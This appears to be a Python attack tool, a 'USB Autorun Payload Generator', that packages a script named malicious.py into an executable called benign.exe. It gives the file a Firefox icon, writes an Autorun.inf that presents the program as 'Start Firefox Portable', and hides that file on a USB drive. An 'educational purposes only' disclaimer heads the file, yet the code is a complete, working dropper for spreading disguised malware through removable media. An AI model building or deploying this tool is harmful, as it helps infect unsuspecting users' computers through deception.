"""
USB Autorun Payload Generator

This script compiles a Python script into a Windows executable using PyInstaller,
creates an autorun file for USB execution, and moves both to a specified USB directory.
It simulates a benign executable with a custom icon and name.

⚠️ FOR EDUCATIONAL PURPOSES ONLY.
DO NOT use this script to create or distribute unauthorized or malicious software.
"""

import PyInstaller.__main__
import shutil
import os
from typing import Optional


def build_executable(source_file: str, output_name: str, icon_path: str, working_dir: str) -> str:
    """
    Compile a Python file into a single .exe file using PyInstaller.

    Args:
        source_file (str): The name of the .py file to convert.
        output_name (str): The name of the resulting .exe file.
        icon_path (str): Path to the .ico icon file to embed.
        working_dir (str): Directory where files will be compiled.

    Returns:
        str: Full path to the compiled .exe file.
    """
    output_path = os.path.join(working_dir, output_name)

    if os.path.isfile(output_path):
        os.remove(output_path)

    PyInstaller.__main__.run([
        source_file,
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        f"--name={output_name}",
        f"--icon={icon_path}"
    ])

    compiled_exe = os.path.join(working_dir, "dist", output_name)
    shutil.move(compiled_exe, output_path)

    # Cleanup
    for folder in ["dist", "build", "__pycache__"]:
        folder_path = os.path.join(working_dir, folder)
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)

    spec_file = os.path.join(working_dir, output_name + ".spec")
    if os.path.isfile(spec_file):
        os.remove(spec_file)

    return output_path


def create_autorun_file(exe_name: str, output_dir: str) -> str:
    """
    Create a Windows-style autorun.inf file to auto-launch the executable.

    Args:
        exe_name (str): Name of the .exe file to run.
        output_dir (str): Directory to save the autorun.inf file.

    Returns:
        str: Full path to the created autorun.inf file.
    """
    autorun_path = os.path.join(output_dir, "Autorun.inf")
    with open(autorun_path, "w") as f:
        f.write("[Autorun]\n")
        f.write(f"Open={exe_name}\n")
        f.write("Action=Start Firefox Portable\n")
        f.write("Label=My USB\n")
        f.write(f"Icon={exe_name}\n")
    return autorun_path


def move_to_usb(exe_path: str, autorun_path: str, usb_dir: str) -> None:
    """
    Move the compiled executable and autorun file to the USB directory.

    Args:
        exe_path (str): Path to the executable.
        autorun_path (str): Path to the autorun.inf file.
        usb_dir (str): Destination directory on the USB drive.
    """
    if not os.path.isdir(usb_dir):
        os.makedirs(usb_dir)

    shutil.move(exe_path, os.path.join(usb_dir, os.path.basename(exe_path)))
    shutil.move(autorun_path, os.path.join(usb_dir, "Autorun.inf"))

    # On Windows, set autorun file to hidden
    if os.name == 'nt':
        os.system(f'attrib +h "{os.path.join(usb_dir, "Autorun.inf")}"')


if __name__ == "__main__":
    # Define base working directory (same as script location)
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Configuration
    source_py = os.path.join(script_dir, "malicious.py")
    output_exe_name = "benign.exe"
    icon_file = os.path.join(script_dir, "Firefox.ico")
    usb_target = os.path.join(script_dir, "USB")

    # Build executable
    final_exe_path = build_executable(source_py, output_exe_name, icon_file, script_dir)

    # Create autorun.inf
    autorun_path = create_autorun_file(output_exe_name, script_dir)

    # Move both to USB
    move_to_usb(final_exe_path, autorun_path, usb_target)
